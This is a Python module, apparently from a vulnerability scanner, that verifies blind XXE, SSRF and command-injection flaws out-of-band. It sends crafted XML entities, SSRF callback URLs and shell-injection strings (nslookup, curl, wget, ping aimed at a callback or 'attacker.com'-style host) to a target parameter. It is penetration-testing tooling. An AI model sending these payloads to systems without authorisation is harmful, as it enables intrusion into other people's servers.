#!/usr/bin/env python3
"""
OOB (Out-of-Band) 验证模块

包含:
- OOBIntegratedVerifier: OOB 集成验证器
  - DNS 外带
  - HTTP 回调
  - 多协议支持
"""
import hashlib
import logging
import secrets
import time
from typing import Any, Dict, List, Optional

from .models import VerificationResult

logger = logging.getLogger(__name__)


class OOBIntegratedVerifier:
    """OOB (Out-of-Band) 集成验证器

    用于需要外部回调确认的漏洞验证，如:
    - Blind XXE
    - Blind SSRF
    - Blind RCE
    - DNS 外带
    """

    def __init__(
        self,
        callback_server: Optional[str] = None,
        dns_server: Optional[str] = None,
        timeout: int = 30,
    ):
        """初始化 OOB 验证器

        Args:
            callback_server: HTTP 回调服务器地址 (如 http://attacker.com/callback)
            dns_server: DNS 外带服务器 (如 attacker.com)
            timeout: 等待回调的超时时间（秒）
        """
        self.callback_server = callback_server
        self.dns_server = dns_server
        self.timeout = timeout
        self._pending_callbacks: Dict[str, Dict[str, Any]] = {}

    def generate_callback_url(
        self,
        vuln_type: str,
        url: str,
        param: str,
    ) -> tuple[str, str]:
        """生成唯一的回调 URL

        Args:
            vuln_type: 漏洞类型
            url: 目标 URL
            param: 注入参数

        Returns:
            tuple: (callback_url, unique_id)
        """
        unique_id = secrets.token_hex(16)
        # 生成短 hash 用于 URL
        short_hash = hashlib.md5(f"{vuln_type}:{url}:{param}".encode()).hexdigest()[:8]

        if self.callback_server:
            callback_url = f"{self.callback_server}/{unique_id}/{short_hash}"
        else:
            callback_url = f"http://callback.example.com/{unique_id}"
            logger.warning("No callback server configured, using placeholder URL")

        # 记录待验证的回调
        self._pending_callbacks[unique_id] = {
            "vuln_type": vuln_type,
            "url": url,
            "param": param,
            "created_at": time.time(),
            "callback_url": callback_url,
            "received": False,
        }

        return callback_url, unique_id

    def generate_dns_payload(
        self,
        vuln_type: str,
        url: str,
        param: str,
    ) -> tuple[str, str]:
        """生成 DNS 外带 payload

        Args:
            vuln_type: 漏洞类型
            url: 目标 URL
            param: 注入参数

        Returns:
            tuple: (dns_domain, unique_id)
        """
        unique_id = secrets.token_hex(8)

        if self.dns_server:
            dns_domain = f"{unique_id}.{self.dns_server}"
        else:
            dns_domain = f"{unique_id}.oob.example.com"
            logger.warning("No DNS server configured, using placeholder domain")

        # 记录待验证的 DNS 查询
        self._pending_callbacks[unique_id] = {
            "vuln_type": vuln_type,
            "url": url,
            "param": param,
            "created_at": time.time(),
            "dns_domain": dns_domain,
            "received": False,
            "type": "dns",
        }

        return dns_domain, unique_id

    def verify_xxe_oob(
        self,
        url: str,
        param: str,
        request_func: Any,
        method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
    ) -> VerificationResult:
        """Blind XXE OOB 验证

        Args:
            url: 目标 URL
            param: XML 注入点参数
            request_func: 发送请求的函数
            method: HTTP 方法
            headers: 自定义请求头
        """
        # 生成回调 URL
        callback_url, unique_id = self.generate_callback_url("XXE", url, param)

        # XXE OOB payloads
        payloads = [
            # 外部 DTD
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>',
            # Parameter entity
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]><foo></foo>',
            # SVG XXE
            f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{callback_url}">]><svg>&xxe;</svg>',
        ]

        if self.dns_server:
            dns_domain, _ = self.generate_dns_payload("XXE", url, param)
            payloads.append(
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{dns_domain}/">]><foo>&xxe;</foo>'
            )

        # 发送请求
        for payload in payloads:
            try:
                request_func(
                    url=url,
                    method=method,
                    data={param: payload} if param else payload,
                    headers=headers,
                )
            except Exception as e:
                logger.debug("XXE request failed (may be expected): %s", e)

        # 等待回调（实际环境中需要异步检查回调服务器）
        # 这里返回待确认状态
        return VerificationResult(
            vuln_type="XXE (Blind/OOB)",
            payload=payloads[0][:100] + "...",
            url=url,
            is_vulnerable=False,  # 需要回调确认
            confidence="low",
            evidence=f"OOB callback sent. Check: {callback_url}",
            response_time=0,
            response_code=0,
            response_length=0,
            verification_method="oob_callback",
            recommendation=f"Monitor callback server for requests from {unique_id}",
        )

    def verify_ssrf_oob(
        self,
        url: str,
        param: str,
        request_func: Any,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
    ) -> VerificationResult:
        """Blind SSRF OOB 验证"""
        callback_url, unique_id = self.generate_callback_url("SSRF", url, param)

        # SSRF payloads 指向回调服务器
        payloads = [
            callback_url,
            f"{callback_url}/ssrf-test",
            callback_url.replace("http://", "http://127.0.0.1@"),  # @ bypass
        ]

        for payload in payloads:
            try:
                request_func(
                    url=url,
                    method=method,
                    params={param: payload} if method == "GET" else None,
                    data={param: payload} if method == "POST" else None,
                    headers=headers,
                )
            except Exception as e:
                logger.debug("SSRF request failed (may be expected): %s", e)

        return VerificationResult(
            vuln_type="SSRF (Blind/OOB)",
            payload=callback_url,
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence=f"OOB callback sent. Check: {callback_url}",
            response_time=0,
            response_code=0,
            response_length=0,
            verification_method="oob_callback",
            recommendation=f"Monitor callback server for requests from {unique_id}",
        )

    def verify_rce_oob(
        self,
        url: str,
        param: str,
        request_func: Any,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
    ) -> VerificationResult:
        """Blind RCE OOB 验证"""
        if not self.dns_server:
            return VerificationResult(
                vuln_type="RCE (Blind/OOB)",
                payload="N/A",
                url=url,
                is_vulnerable=False,
                confidence="low",
                evidence="DNS server not configured for OOB verification",
                response_time=0,
                response_code=0,
                response_length=0,
                verification_method="oob_dns",
                recommendation="Configure DNS server for OOB verification",
            )

        dns_domain, unique_id = self.generate_dns_payload("RCE", url, param)

        # RCE payloads - 触发 DNS 查询
        payloads = [
            # Linux
            f"; nslookup {dns_domain}",
            f"| nslookup {dns_domain}",
            f"`nslookup {dns_domain}`",
            f"$(nslookup {dns_domain})",
            f"; ping -c 1 {dns_domain}",
            f"; curl http://{dns_domain}/",
            f"; wget http://{dns_domain}/",
            # Windows
            f"& nslookup {dns_domain}",
            f"| nslookup {dns_domain}",
            f"; ping -n 1 {dns_domain}",
        ]

        for payload in payloads:
            try:
                request_func(
                    url=url,
                    method=method,
                    params={param: payload} if method == "GET" else None,
                    data={param: payload} if method == "POST" else None,
                    headers=headers,
                )
            except Exception as e:
                logger.debug("RCE request failed (may be expected): %s", e)

        return VerificationResult(
            vuln_type="RCE (Blind/OOB)",
            payload=payloads[0],
            url=url,
            is_vulnerable=False,
            confidence="low",
            evidence=f"OOB DNS lookup triggered. Monitor: {dns_domain}",
            response_time=0,
            response_code=0,
            response_length=0,
            verification_method="oob_dns",
            recommendation=f"Check DNS logs for queries to {unique_id}.{self.dns_server}",
        )

    def check_callback(self, unique_id: str) -> Optional[Dict[str, Any]]:
        """检查是否收到回调

        Args:
            unique_id: 唯一标识符

        Returns:
            回调详情（如果收到）或 None
        """
        if unique_id in self._pending_callbacks:
            callback_info = self._pending_callbacks[unique_id]
            if callback_info.get("received"):
                return callback_info
        return None

    def mark_callback_received(
        self,
        unique_id: str,
        source_ip: str = "",
        user_agent: str = "",
    ) -> bool:
        """标记回调已收到（由回调服务器调用）

        Args:
            unique_id: 唯一标识符
            source_ip: 来源 IP
            user_agent: User-Agent

        Returns:
            是否成功标记
        """
        if unique_id in self._pending_callbacks:
            self._pending_callbacks[unique_id].update(
                {
                    "received": True,
                    "received_at": time.time(),
                    "source_ip": source_ip,
                    "user_agent": user_agent,
                }
            )
            logger.info("OOB callback received: %s from %s", unique_id, source_ip)
            return True
        return False

    def get_pending_callbacks(self) -> List[Dict[str, Any]]:
        """获取所有待确认的回调"""
        return [
            {**info, "id": uid}
            for uid, info in self._pending_callbacks.items()
            if not info.get("received")
        ]

    def cleanup_expired(self, max_age: int = 3600) -> int:
        """清理过期的回调记录

        Args:
            max_age: 最大保留时间（秒）

        Returns:
            清理的记录数
        """
        now = time.time()
        expired = [
            uid
            for uid, info in self._pending_callbacks.items()
            if now - info.get("created_at", 0) > max_age
        ]
        for uid in expired:
            del self._pending_callbacks[uid]
        return len(expired)


def verify_with_oob(url: str, param: str, vuln_type: str) -> Dict[str, Any]:
    """便捷函数: 使用 OOB 验证漏洞

    Args:
        url: 目标 URL
        param: 参数名
        vuln_type: 漏洞类型 (ssrf/xxe/rce)

    Returns:
        验证结果字典
    """
    import urllib.request
    import urllib.parse

    verifier = OOBIntegratedVerifier()

    # 创建一个简单的请求函数
    def simple_request(
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> None:
        target_url = url
        request_data: Optional[bytes] = None

        try:
            if method.upper() == "GET":
                if params:
                    query = urllib.parse.urlencode(params)
                    target_url = f"{url}?{query}"
                req = urllib.request.Request(target_url)
            else:
                if data is not None:
                    request_data = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(target_url, data=request_data, method=method)

            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)

            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            logger.debug("Request failed: %s", e)

    vuln_type_lower = vuln_type.lower()

    if vuln_type_lower == "xxe":
        result = verifier.verify_xxe_oob(url, param, simple_request)
    elif vuln_type_lower == "ssrf":
        result = verifier.verify_ssrf_oob(url, param, simple_request)
    elif vuln_type_lower == "rce":
        result = verifier.verify_rce_oob(url, param, simple_request)
    else:
        return {"error": f"Unsupported vuln type for OOB: {vuln_type}"}

    return {
        "vuln_type": result.vuln_type,
        "url": result.url,
        "payload": result.payload,
        "is_vulnerable": result.is_vulnerable,
        "confidence": result.confidence,
        "evidence": result.evidence,
        "verification_method": result.verification_method,
        "recommendation": result.recommendation,
    }